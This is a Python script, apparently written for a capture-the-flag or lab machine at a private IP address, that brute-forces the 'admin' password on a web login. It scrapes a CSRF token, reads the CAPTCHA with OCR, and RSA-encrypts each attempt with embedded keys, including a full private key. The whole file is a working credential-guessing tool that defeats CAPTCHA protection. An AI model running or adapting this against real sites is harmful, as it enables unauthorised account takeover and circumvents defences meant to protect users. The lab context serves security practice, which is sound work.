import time
import io
import numpy as np
import os
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
import json
import base64
from PIL import Image

os.environ["TORCH_CPP_LOG_LEVEL"] = "ERROR"

import easyocr

reader = easyocr.Reader(['en'])



# CONFIG
ip = 'http://10.10.200.243'
login_url = f'{ip}/index.php'
dashboard_url = f"dashboard.php"
captcha_url = f'{ip}/captcha.php'
server_url = f"{ip}/server.php"
username = "admin"
wordlist = "wordlist.txt"

with open(wordlist, 'r', encoding='utf-8') as file:
    passwords = [line.strip() for line in file]

session = requests.Session()

started = time.time()

server_public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt38SAt9XfLRClH+41yxl
NIEOrHcZjGjrZZVV/R/XcuFJI2bBInWrmcnrQguajtO1tehWrdSCto+kP6wI2NyR
qL8tpuovK6SO1KT+TpkceeZyJIN+QGnp19pbLeDG3xZXK94AKxB0xH59DWHWcHNs
ktLz3RnW4xX+YI3o5hn/fcgPrxQ6kK4jYPm0xtbIYtcc86zH9+Cv6R+Y0rwfAXtG
0+YAJDYYRo0Aro1uV2zCG/9Khy/Dxrvm3Qc4OAidZsoS6dFv+0/Hp3UxF8FfAExw
Iwfx6YKfiC4xpGuDlxkyuP90L9T0Ke8KPfKhAqc5+aHE0EqYkXDRQQVrF5fmjdRk
LwIDAQAB
-----END PUBLIC KEY-----"""

client_private_key_pem = b"""-----BEGIN PRIVATE KEY-----
MIIEuwIBADANBgkqhkiG9w0BAQEFAASCBKUwggShAgEAAoIBAQC1DwWR7yGlsNpg
YaBHWheqnLoZvGuSr3MWcZyoHrql5iwzzOolmu00WwaGiuOwPyl4GjRCR4rwXpGq
sMJiYuwOG6w9gPzIDg1Y11cPtkqzxZ20kX/8DFFlGiurwAK6SOkrtfhLYF56YDJg
WS7lVwtVq5LstdzSeTEtvSFdhNedUZW8l319AYJGjByXwNMUW3u21wGff8hDN8Yu
AMrciW1UJFO2aN39v8Vev1VrAvRItFK1znCq0eNRJKjruEztXO/vZzR8Lc0BA0Uj
OyIizkEQKBx5/OTRf8rqO5CkqcLcr/f0u4ZlH6cJg9jOVJlTeb37S94d3uSx+4Pb
EIw+/Hm7AgMBAAECgf8ICgCTLWjRDCLINdG9WUs8P4YD0bfB1BmDy/8PEYFrQrNv
dzrMG1CgHBU2n9HztJX4HQ+bWTyFPHp/iJ3lr1yYmRlqkJxkZ7LJnOg4KD3CeWGg
zX+2l6I4wV+mfE74B4j9gXTAjrGBEtVuC1R4pykEV/e/JHYpjOKqpTsi0kMm9LH5
a3eiLKtP+zAL+s7DEQopALi2oEq5/0+hJxZVYUX0P6q+A/o5kdheXeWjEuL9nUDR
YM/bcnAOKTE9B7+sZ5SUGDwf6L+MpTBLN7rnNvli6mykmvYwCeFYOKAVXjcFWRg1
3kR0yVxkpPBXC97CZyRsYiRHiYEzRKZo5eHRhHkCgYEA7nPGUNhHtXeT5oIurZgJ
K/FePMzgBxbDXtbAHEpw378Y90BjUUB7YxAZxhiTO1wKsAWhr1VQOdWmqlTrhurN
/XGxrpMuDRuNkYbXjjvmv4SpdgW5YnXR9BA1bjwWbuEoqsLu//oNySrbLVlYP2he
Q3rXeCN2BZDStte2D6VrQukCgYEAwmIBCOjaBWh8VnxnoSsSdjUf1/oXAIzKpEwO
waZadwsqau3ITARGjz0cMuV8s7gXAU6fskXqIMvaAxvr1/GXfoIGTSuSwNRW0MKI
k26HK++R7TPISLXC1PpF33z+uBRi6wiYeRsG+Jo5l4pW9fD4KBSFs2P9H5njWeW+
hH0MiQMCgYEAzCJvD3zoftDc3ARsw44Zo/XhUDmwPEFfhgxgsJeF4/ZsABeuLrv+
JYN+HRmiybl1KNXZYgmuQaTHJqDGdV0EdclkbGhxjyUcYA5I8OoVE7YVgQVLfKAS
2lcZ9sIYDlpRf0acZqWCMcqvkjYfl0DZGfnLBn2NJxyhV4h5wxFBLykCgYAJ9zxW
WJnU7SZyyK4HdU3dAZxAVnIXdSBui/e1tfGtaMUj9kzumMmFTnzDn0Bldmq3hnBp
k2wNgmYLAsN0rs41jjUEf9dmS3yn91FJPcFwXzf8EUuTbr4ubSZn7uCgT2tC4Y3v
p5MT69RIEK+krFYMuACi0d2IYTtmwICkCkU6QQKBgGlXG0c681f1lYVAVryEszrO
We9+VRrO3pDiyY348HBdwyyXpn7vfK+fF5C+prDEtO5IQ6v/tdeYfzKVa0iZhIUF
kp2XdXBSHm7ykeY5LYUAjhoShT2Y3gT1oEH5DjqdTA0oJ0DSvbzMchi+uO5e0ZHO
xuASizGvaR+gZ9+ANTmJ
-----END PRIVATE KEY-----"""

from cryptography.hazmat.backends import default_backend


server_public_key = serialization.load_pem_public_key(server_public_key_pem, backend=default_backend())
client_private_key = serialization.load_pem_private_key(client_private_key_pem, password=None, backend=default_backend())

def encrypt_data(plaintext: str) -> str:
    ciphertext = server_public_key.encrypt(
        plaintext.encode(),
        padding.PKCS1v15()
    )
    return base64.b64encode(ciphertext).decode()

def decrypt_data(ciphertext_b64: str) -> str:
    ciphertext = base64.b64decode(ciphertext_b64)
    plaintext = client_private_key.decrypt(
        ciphertext,
        padding.PKCS1v15()
    )
    return plaintext.decode()

def get_login_page_data():
    r = session.get(login_url)
    r.raise_for_status()

    from bs4 import BeautifulSoup
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', {'id': 'csrf_token'})['value']

    # Fetch captcha image
    r_captcha = session.get(captcha_url)
    r_captcha.raise_for_status()

    return csrf_token, r_captcha.content

# Your OCR logic here
def ocr_captcha(image_bytes):
    image = Image.open(io.BytesIO(image_bytes)).convert("RGB")
    image_np = np.array(image).astype('uint8')
    allowed_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    result_text = reader.readtext(image_np, allowlist=allowed_chars)
    if result_text:
        return result_text[0][1].strip()
    return ""



for password in passwords:
    while True:
        try:
            csrf_token, captcha_image = get_login_page_data()
        except Exception as e:
            print(f"[!] Error loading login page or captcha: {e}")
            time.sleep(1)
            continue

        captcha_text = ocr_captcha(captcha_image)
        print(f"[*] OCR Captcha: {captcha_text}")

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print("[!] OCR failed or invalid captcha length, retrying...")
            time.sleep(0.5)
            continue

        params = f"action=login&csrf_token={csrf_token}&username={username}&password={password}&captcha_input={captcha_text}"

        encrypted = encrypt_data(params)

        payload = json.dumps({"data": encrypted})

        headers = {'Content-Type': 'application/json'}

        try:
            response = session.post(server_url, data=payload, headers=headers)
            response.raise_for_status()
            response_json = response.json()

            if "data" in response_json:
                decrypted_response = decrypt_data(response_json["data"])
                print(f"[*] Server response: {decrypted_response}")

                if "Login successful" in decrypted_response:
                    print(f"[+] Login successful with password: {password}")
                    duration = time.time() - started
                    print(f"Took: {duration:.2f} seconds")

                    exit(0)
                elif "Login failed" in decrypted_response:
                    print(f"[-] Failed login with password: {password}")
                    break 
                else:
                    print(f"[!] Unexpected response: {decrypted_response}")
                    continue
            else:
                print("[!] No data field in server response")
                continue

        except Exception as e:
            print(f"[!] Request or decryption error: {e}")
            time.sleep(1)
            continue